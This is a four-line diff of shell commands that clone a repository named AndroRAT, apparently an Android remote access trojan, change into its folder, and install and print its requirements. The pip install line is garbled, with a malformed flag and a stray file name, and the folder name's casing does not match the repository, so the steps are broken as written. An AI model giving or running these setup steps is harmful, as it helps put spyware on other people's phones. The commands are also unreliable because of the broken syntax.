@@ -1,0 +1,4 @@
+$ git clone https://github.com/The404Hacking/AndroRAT.git
+$ cd Androrat/
+$ pip install-r- requirements.txt utits.py
+$ cat requirements.txt
